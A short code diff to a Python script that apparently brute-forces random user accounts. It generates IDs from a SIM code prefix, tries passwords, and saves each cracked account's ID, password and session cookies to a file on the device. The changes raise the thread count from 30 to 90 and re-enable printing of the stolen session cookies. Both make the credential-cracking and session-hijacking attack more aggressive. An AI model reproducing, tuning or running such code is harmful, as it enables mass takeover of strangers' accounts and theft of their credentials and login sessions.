@@ -141,7 +141,7 @@ def _bd_():
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
     clear()
-    with Habib(max_workers=30) as sexy:
+    with Habib(max_workers=90) as sexy:
         clear()
         print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
         print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
@@ -825,7 +825,7 @@ def randm(ids,psd):
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 print(f'\r\r{G1}[AJ-OK] {uid} | {pas}')
-                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
+                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                 open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
                 break
@@ -875,5 +875,6 @@ def Subscraption():
 Subscraption()         
 menu()
 #__________________[ END ]__________________#
+
 
 
